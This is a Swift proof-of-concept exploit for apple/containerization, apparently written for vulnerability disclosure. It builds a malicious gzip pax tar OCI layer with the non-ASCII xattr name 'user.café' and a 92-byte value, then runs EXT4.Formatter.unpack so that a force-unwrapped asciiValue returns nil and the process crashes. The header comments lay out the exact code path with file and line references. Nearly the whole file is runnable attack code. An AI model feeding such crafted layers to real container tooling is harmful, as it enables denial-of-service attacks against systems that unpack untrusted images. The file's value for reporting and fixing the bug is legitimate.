// ============================================================
// PoCOCICrash — CWE-476 end-to-end OCI ingress PoC
// apple/containerization — ContainerizationEXT4 / ContainerizationArchive
//
// Realistic attack path:
//   attacker-controlled OCI image layer (pax+gzip tar)
//     → ArchiveReader reads entry.xattrs via archive_entry_xattr_next()
//       (WriteEntry.swift:274 — no ASCII check on xattr name)
//     → Formatter.unpackEntries() → create(..., xattrs: entry.xattrs)
//       (Formatter+Unpack.swift:153/158/171)
//     → FileXattrsState.add() → size > inodeFreeBytes → blockAttributes
//     → writeBlockAttributes() → UInt32(attribute.hash)
//       (EXT4+Xattrs.swift:232)
//     → hash getter → char.asciiValue! on 'é' → nil → FATAL TRAP
//       (EXT4+Xattrs.swift:60)
//
// This PoC exercises the FULL unpack ingress path (not create() directly).
// Build: swift build --target PoCOCICrash  (swift-tools-version: 6.2)
// ============================================================

import Foundation
import SystemPackage
import ContainerizationEXT4
import ContainerizationArchive

// ──────────────────────────────────────────────────────────────
// Step 1: craft a malicious paxRestricted+gzip OCI layer
// ──────────────────────────────────────────────────────────────
let tarPath = URL(fileURLWithPath: "/tmp/poc_oci_layer_\(Int.random(in: 10000...99999)).tar.gz")
print("[*] Crafting malicious OCI layer (pax+gzip) at: \(tarPath.path)")

// Non-ASCII xattr name → asciiValue! will trap on 'é'
let maliciousXattrName  = "user.caf\u{00E9}"         // "user.café"
let maliciousXattrValue = Data(repeating: 0x41, count: 92) // 92 bytes → block storage path

let badChar: Character = "\u{00E9}"
print("[*] 'é'.asciiValue = \(String(describing: badChar.asciiValue)) (nil → will trap)")
print("[*] xattr name: \(maliciousXattrName.debugDescription)  value: \(maliciousXattrValue.count) bytes")
print("[*] attribute.size = \(12 + 92) > ~68 inodeFreeBytes → block storage → hash() called")

do {
    let writer = try ArchiveWriter(format: .paxRestricted, filter: .gzip, file: tarPath)
    let entry = WriteEntry()
    entry.path = "/trigger.txt"
    entry.fileType = .regular
    entry.permissions = 0o100644
    entry.size = 4

    // Attacker injects non-ASCII xattr name in OCI layer tar header
    entry.xattrs = [maliciousXattrName: maliciousXattrValue]

    let fileData = Data("data".utf8)
    try writer.writeEntry(entry: entry, data: fileData)
    try writer.finishEncoding()
    print("[*] Malicious OCI layer written successfully")
} catch {
    print("[-] Failed to create malicious tar: \(error)")
    exit(1)
}

// ──────────────────────────────────────────────────────────────
// Step 2: trigger crash via the real OCI unpack ingress path
// ──────────────────────────────────────────────────────────────
let imgPath = FilePath("/tmp/poc_oci_ext4_\(Int.random(in: 10000...99999)).ext4")
print("[*] EXT4.Formatter at: \(imgPath)")

let formatter: EXT4.Formatter
do {
    formatter = try EXT4.Formatter(imgPath)
} catch {
    print("[-] Formatter init failed: \(error)")
    exit(1)
}

print("[*] Calling EXT4.Formatter.unpack(source:format:compression:) ...")
print("[*] Path: unpack → unpackEntries → create(xattrs:entry.xattrs) → writeBlockAttributes")
print("[*]       → UInt32(attribute.hash) → hash.getter → char.asciiValue! on 'é' → FATAL TRAP")
fflush(stdout)

// THE CRASH — full OCI ingress path, not direct create() call
let runTask = Task {
    do {
        try await formatter.unpack(
            source: tarPath,
            format: .paxRestricted,
            compression: .gzip
        )
        print("[-] UNEXPECTED: returned without crash")
        exit(1)
    } catch {
        print("[-] Caught error (crash should have fired first): \(error)")
        exit(1)
    }
}

RunLoop.main.run()
